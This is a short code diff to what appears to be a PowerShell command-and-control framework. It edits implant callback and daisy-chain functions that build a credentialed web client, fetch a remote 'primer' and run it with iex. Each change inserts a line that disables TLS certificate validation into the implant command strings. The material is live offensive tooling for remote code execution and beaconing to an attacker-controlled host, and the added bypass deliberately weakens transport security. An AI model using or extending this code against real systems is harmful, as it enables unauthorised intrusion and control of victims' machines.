@@ -248,7 +248,8 @@ function Implant-Handler
     # run startup function
     startup
     # call back command
-    $command = 'function Get-Webclient ($Cookie) {
+    $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+function Get-Webclient ($Cookie) {
 $wc = New-Object System.Net.WebClient; 
 $wc.UseDefaultCredentials = $true; 
 $wc.Proxy.Credentials = $wc.Credentials;
@@ -304,7 +305,8 @@ primer | iex }'
             [Object]
             $proxyurl
         )
-        $command = 'function Get-Webclient ($Cookie)
+        $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+function Get-Webclient ($Cookie)
 {
 $username = "'+$username+'"
 $password = "'+$password+'"
@@ -352,6 +354,7 @@ function Invoke-DaisyChain {
 param($port, $daisyserver)
 
 $daisycommand = '$serverhost="'+$daisyserver+'"
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 $serverport='+$port+'
 $server=$serverhost+":"+$serverport
 function Get-Webclient ($Cookie) {
